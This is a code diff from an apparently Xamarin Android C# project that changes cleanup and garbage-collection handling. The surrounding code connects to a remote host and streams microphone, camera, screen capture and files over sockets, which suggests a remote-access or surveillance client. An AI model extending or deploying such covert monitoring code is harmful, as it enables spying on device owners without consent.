@@ -115,24 +115,11 @@ namespace Task2
             {
                 try
                 {
-                    if(ipadresi != null)
-                    {
-                        try { GC.SuppressFinalize(ipadresi); } catch { }
-                        
-                    }
-                    if(endpoint != null)
-                    {
-                        try { GC.SuppressFinalize(endpoint); } catch { }
-                    }
-                    GC.Collect();
-
                     ipadresi = Dns.GetHostAddresses(MainValues.IP)[0];
                     endpoint = new IPEndPoint(ipadresi, MainValues.port);
 
                     if (Soketimiz != null) {
-                        try { Soketimiz.Close(); } catch (Exception) { } try { Soketimiz.Dispose(); } catch (Exception) { }
-                        GC.SuppressFinalize(Soketimiz);
-                        
+                        try { Soketimiz.Close(); } catch (Exception) { } try { Soketimiz.Dispose(); } catch (Exception) { }                     
                     }
                     GC.Collect();
                     Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
@@ -221,14 +208,17 @@ namespace Task2
                     int readed = tmp.EndReceive(ar); // classic socket async result operation.
                     if (readed > 0)
                     {
-                        memos.Write(dataByte, 0, readed); // write readed data to memorystream.
-                        try
+                        if (memos != null)
                         {
-                            // give as param our memorystream to our byte[] splitter,
-                            // and process the byte[] arrays as data buffer [byte[]], tag text [string] and extra infos [string]
-                            await UnPacker(tmp, memos);
+                            memos.Write(dataByte, 0, readed); // write readed data to memorystream.
+                            try
+                            {
+                                // give as param our memorystream to our byte[] splitter,
+                                // and process the byte[] arrays as data buffer [byte[]], tag text [string] and extra infos [string]
+                                await UnPacker(tmp, memos);
+                            }
+                            catch (Exception) { }
                         }
-                        catch (Exception) { }
                     }
                     await Task.Delay(1); // reduce high cpu usage. :)
                     tmp.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, endRead, null);
@@ -251,6 +241,10 @@ namespace Task2
                     tmp_form.micStop();
                     tmp_form.stopProjection();
                     mySocketConnected = false;
+                    if(memos != null)
+                    {
+                        memos.Flush(); memos.Close(); memos.Dispose();
+                    }
                     Dispose();
                     GC.Collect();
                     if (tmp_form.CLOSE_CONNECTION == false)
@@ -414,11 +408,9 @@ namespace Task2
                 AlarmManager alarmManager = (AlarmManager)context.GetSystemService(AlarmService);
                 alarmManager.Cancel(sender); alarmManager.Dispose();
                 intent.Dispose();
-                GC.SuppressFinalize(intent);
-                GC.SuppressFinalize(alarmManager);
-                GC.Collect();
             }
             catch (Exception) { }
+            GC.Collect();
         }
         public void kameraCek(Socket soket)
         {
@@ -613,7 +605,7 @@ namespace Task2
                 audioStream.OnBroadcast += AudioStream_OnBroadcast;
                 audioStream.Start();
             }
-            catch (Exception) { }
+            catch (Exception ) { }
         }
 
         public void micStop()
@@ -624,13 +616,13 @@ namespace Task2
             {
                 audioStream.Stop();
                 audioStream.Flush();
-                GC.SuppressFinalize(audioStream);
+                audioStream = null;
             }
             if (client != null)
             {
                 client.Close();
                 client.Dispose();
-                GC.SuppressFinalize(client);
+                client = null;
             }
             GC.Collect();
         }
@@ -841,9 +833,8 @@ namespace Task2
             {
                 try { ImageAvailableListener.screenSock.Close(); } catch { }
                 try { ImageAvailableListener.screenSock.Dispose(); } catch { }
-                GC.SuppressFinalize(ImageAvailableListener.screenSock);
-                GC.Collect();
             }
+            GC.Collect();
         }
         protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
         {
@@ -1413,7 +1404,6 @@ namespace Task2
                     {
                         try { sendFile.Close(); } catch { }
                         try { sendFile.Dispose(); } catch { }
-                        GC.SuppressFinalize(sendFile);
                     }
 
                     if (ms != null) { ms.Flush(); ms.Close(); ms.Dispose(); }
